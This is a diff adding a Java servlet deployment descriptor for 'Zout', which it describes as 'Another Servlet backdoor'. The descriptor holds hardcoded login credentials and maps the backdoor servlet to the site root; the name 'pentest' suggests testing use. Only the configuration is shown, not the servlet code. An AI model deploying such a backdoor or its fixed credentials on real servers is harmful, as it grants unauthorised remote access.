@@ -1,0 +1,42 @@
+<?xml version="1.0" ?>
+<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
+         version="2.4">
+
+	<display-name>Zout</display-name>
+	<description>Another Servlet backdoor.</description>
+
+	<context-param>
+		<param-name>username</param-name>
+		<param-value>pentest</param-value>
+		<description>The password required for use.</description>
+	</context-param>
+	
+	<context-param>
+		<param-name>password</param-name>
+		<param-value>asdf222</param-value>
+		<description>The password required for use.</description>
+	</context-param>
+
+	<servlet>
+		<servlet-name>HelloWorld</servlet-name>
+		<servlet-class>net.xelphene.zout.servlet.HelloWorld</servlet-class>		
+	</servlet>
+
+	<servlet>
+		<servlet-name>Zout</servlet-name>
+		<servlet-class>net.xelphene.zout.servlet.Zout</servlet-class>		
+	</servlet>
+	
+	<servlet-mapping>
+		<servlet-name>HelloWorld</servlet-name>
+		<url-pattern>/hello</url-pattern>
+	</servlet-mapping>
+
+	<servlet-mapping>
+		<servlet-name>Zout</servlet-name>
+		<url-pattern>/</url-pattern>
+	</servlet-mapping>
+
+</web-app>
